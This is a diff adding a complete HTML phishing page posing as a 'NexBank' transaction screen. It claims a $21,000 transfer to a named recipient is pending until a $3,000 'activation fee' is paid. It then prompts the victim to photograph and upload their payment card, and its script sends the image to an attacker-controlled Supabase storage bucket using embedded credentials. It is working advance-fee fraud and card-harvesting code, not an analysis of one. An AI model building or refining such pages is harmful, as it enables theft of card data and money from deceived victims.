@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>NexBank - Transaction Details</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0d14;
+    --surface: #111520;
+    --accent: #4f8bff;
+    --text: #f0f4ff;
+    --muted: #6b7a99;
+  }
+
+  body {
+    font-family: 'Sora', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  .phone {
+    width: 100%;
+    max-width: 390px;
+    padding: 40px 20px;
+    text-align: center;
+  }
+
+  .icon-circle {
+    width: 70px;
+    height: 70px;
+    background: rgba(79, 139, 255, 0.15);
+    border: 2px solid var(--accent);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 24px;
+    color: var(--accent);
+    font-size: 30px;
+  }
+
+  h1 { font-size: 20px; margin-bottom: 20px; }
+  
+  .details-box {
+    background: var(--surface);
+    border-radius: 14px;
+    padding: 20px;
+    margin-bottom: 24px;
+    text-align: left;
+  }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 12px;
+  }
+  
+  .label { color: var(--muted); font-size: 13px; }
+  .value { font-weight: 600; font-size: 13px; }
+
+  p { color: var(--muted); font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+
+  .upload-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: 10px;
+  }
+
+  .card-field {
+    flex: 1;
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.07);
+    padding: 16px;
+    border-radius: 14px;
+    color: var(--muted);
+    font-size: 13px;
+    text-align: left;
+  }
+
+  .camera-btn {
+    width: 50px;
+    height: 50px;
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 20px;
+  }
+
+  .send-btn {
+    display: block;
+    width: 100%;
+    margin-top: 20px;
+    background: linear-gradient(135deg, var(--accent), #7c5cfc);
+    color: #fff;
+    padding: 16px;
+    border-radius: 14px;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+  
+  .send-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  #status-message {
+    margin-top: 15px;
+    font-size: 13px;
+    color: var(--accent);
+    display: none;
+    line-height: 1.4;
+  }
+
+  #error-message {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #ff5c5c;
+    display: none;
+    line-height: 1.4;
+    background: rgba(255, 92, 92, 0.08);
+    border: 1px solid rgba(255, 92, 92, 0.25);
+    border-radius: 10px;
+    padding: 12px 14px;
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+  <div class="icon-circle">⌛</div>
+  <h1>Transaction has started</h1>
+  
+  <div class="details-box">
+    <div class="detail-row">
+      <span class="label">Recipient</span>
+      <span class="value">Kassandra A R M Horvath</span>
+    </div>
+    <div class="detail-row">
+      <span class="label">Amount</span>
+      <span class="value">$21,000.00</span>
+    </div>
+    <div class="detail-row">
+      <span class="label" style="color: var(--accent);">Activation fee</span>
+      <span class="value" style="color: var(--accent);">$3,000.00</span>
+    </div>
+  </div>
+
+  <p>The money will be deposited after payment of the activation fee.</p>
+  
+  <div class="upload-container">
+    <div class="card-field" id="file-name-display">Upload your card</div>
+    <label for="file-upload" class="camera-btn">📷</label>
+    <input type="file" id="file-upload" accept="image/*" style="display: none;" onchange="updateFileName()">
+  </div>
+
+  <button class="send-btn" id="send-btn" onclick="uploadCardPhoto()">Send</button>
+  <div id="status-message">Your photo has been received and is being processed. You will receive an email shortly for confirmation.</div>
+  <div id="error-message">⚠️ Upload failed. Please select another photo and try again.</div>
+</div>
+
+<!-- Load Supabase SDK once -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+  const SUPABASE_URL = 'https://dmavecishluzeqdddaqy.supabase.co';
+  const SUPABASE_KEY = 'sb_publishable_aTPFO65SpkKXmku2Nm7XGQ_tgRcXpFg';
+
+  // ✅ Fix: destructure createClient from the global supabase namespace
+  const { createClient } = supabase;
+  const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+  function updateFileName() {
+    const input = document.getElementById('file-upload');
+    const display = document.getElementById('file-name-display');
+    if (input.files.length > 0) {
+      display.textContent = input.files[0].name;
+    }
+  }
+
+  async function uploadCardPhoto() {
+    const fileInput = document.getElementById('file-upload');
+    const sendBtn = document.getElementById('send-btn');
+    const statusMsg = document.getElementById('status-message');
+    const errorMsg = document.getElementById('error-message');
+
+    // Hide any previous messages
+    statusMsg.style.display = 'none';
+    errorMsg.style.display = 'none';
+
+    if (fileInput.files.length === 0) {
+      alert("Please select a photo first.");
+      return;
+    }
+
+    const file = fileInput.files[0];
+    const fileExt = file.name.split('.').pop();
+    const fileName = `${Date.now()}_${Math.random().toString(36).substring(7)}.${fileExt}`;
+    const filePath = `cards/${fileName}`;
+
+    sendBtn.textContent = 'Uploading...';
+    sendBtn.disabled = true;
+
+    try {
+      const { data, error } = await supabaseClient.storage
+        .from('uploads')
+        .upload(filePath, file);
+
+      if (error) throw error;
+
+      // Success: show message, keep button active for another upload
+      statusMsg.style.display = 'block';
+      setTimeout(() => { statusMsg.style.display = 'none'; }, 30000);
+      sendBtn.textContent = 'Send';
+      sendBtn.disabled = false;
+      fileInput.value = '';
+      document.getElementById('file-name-display').textContent = 'Enter your receipt';
+
+    } catch (err) {
+      console.error('Upload Error:', err);
+      // Failure: show inline error, re-enable everything
+      errorMsg.textContent = '\u26a0\ufe0f Send failed: ' + err.message + '. Please select another photo and try again.';
+      errorMsg.style.display = 'block';
+      setTimeout(() => { errorMsg.style.display = 'none'; }, 30000);
+      sendBtn.textContent = 'Send';
+      sendBtn.disabled = false;
+      fileInput.value = '';
+      document.getElementById('file-name-display').textContent = 'Enter your receipt';
+    }
+  }
+</script>
+
+</body>
+</html>
